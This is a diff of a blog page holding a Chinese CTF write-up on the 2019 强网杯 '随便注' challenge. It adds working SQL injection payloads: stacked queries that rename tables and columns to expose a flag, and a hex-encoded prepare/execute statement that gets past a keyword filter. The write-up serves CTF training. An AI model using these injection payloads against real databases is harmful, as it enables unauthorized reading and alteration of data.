@@ -17,7 +17,7 @@
 <meta property="og:description" content="强网杯2019 web随便注 return preg_match">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2020-01-12T13:54:26.000Z">
-<meta property="article:modified_time" content="2020-01-13T10:18:50.992Z">
+<meta property="article:modified_time" content="2020-03-11T02:14:05.039Z">
 <meta property="article:author" content="Peguin">
 <meta property="article:tag" content="堆叠注入">
 <meta name="twitter:card" content="summary">
@@ -118,7 +118,7 @@
 				
 				<section class="switch-part switch-part2">
 					<div class="widget tagcloud" id="js-tagcloud">
-						<a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/Xss%E6%80%BB%E7%BB%93/" style="font-size: 10px;">Xss总结</a> <a href="/tags/climb/" style="font-size: 10px;">climb</a> <a href="/tags/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" style="font-size: 10px;">linux常用命令</a> <a href="/tags/something-import/" style="font-size: 10px;">something import</a> <a href="/tags/sql%E6%80%BB%E7%BB%93/" style="font-size: 10px;">sql总结</a> <a href="/tags/ssrf/" style="font-size: 10px;">ssrf</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">堆叠注入</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" style="font-size: 10px;">绕过技巧</a> <a href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">逻辑漏洞</a>
+						<a href="/tags/XXE/" style="font-size: 10px;">XXE</a> <a href="/tags/Xss%E6%80%BB%E7%BB%93/" style="font-size: 10px;">Xss总结</a> <a href="/tags/climb/" style="font-size: 10px;">climb</a> <a href="/tags/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" style="font-size: 10px;">linux常用命令</a> <a href="/tags/something-import/" style="font-size: 10px;">something import</a> <a href="/tags/sql%E6%80%BB%E7%BB%93/" style="font-size: 10px;">sql总结</a> <a href="/tags/ssrf/" style="font-size: 10px;">ssrf</a> <a href="/tags/train/" style="font-size: 10px;">train</a> <a href="/tags/wp/" style="font-size: 10px;">wp</a> <a href="/tags/%E5%8D%81%E4%B8%89%E7%82%B9/" style="font-size: 10px;">十三点</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">堆叠注入</a> <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" style="font-size: 10px;">文件上传</a> <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" style="font-size: 10px;">文件包含</a> <a href="/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" style="font-size: 10px;">模板注入</a> <a href="/tags/%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" style="font-size: 10px;">绕过技巧</a> <a href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">逻辑漏洞</a>
 					</div>
 				</section>
 				
@@ -215,9 +215,13 @@
 <p>return preg_match<a id="more"></a>(“/select|update|delete|drop|insert|where|./i”,$inject);过滤了括号内的东西<br>?a=1#返回正常</p>
 <p>考虑用堆叠注入</p>
 <p>堆叠查询 <code>id=1&#39;;show databases;</code>‘爆出数据库内容<br><code>id=1&#39;;show tables;&#39;</code>爆出所有表名</p>
-<p>因为alert,rename没有被过滤，可以改变表名</p>
-<p><code>/?inject=1&#39;;RENAME TABLE &#39;words&#39; TO&#39;words1&#39;;RENAME TABLE ‘1919810931114514&#39; TO &#39;words&#39;;ALTER TABLE words CHANGE &#39;flag&#39; &#39;id&#39; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;%23</code></p>
+<p>1.因为alert,rename没有被过滤，可以改变表名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`/?inject=1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);*#*</span><br><span class="line">拆开来：</span><br><span class="line">1';</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">rename</span> <span class="keyword">to</span> words1;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> <span class="string">`1919810931114514`</span> <span class="keyword">rename</span> <span class="keyword">to</span> words;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> words <span class="keyword">change</span> flag <span class="keyword">id</span> <span class="built_in">varchar</span>(<span class="number">50</span>);</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
 <p>最后直接通过i’or’1’=’1可以爆出flag</p>
+<p>2.预编译：16进制绕过</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1';</span><br><span class="line"><span class="keyword">SeT</span>@a=<span class="number">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;</span><br><span class="line"><span class="keyword">prepare</span> execsql <span class="keyword">from</span> @a;</span><br><span class="line"><span class="keyword">execute</span> execsql;<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
 
       
     </div>
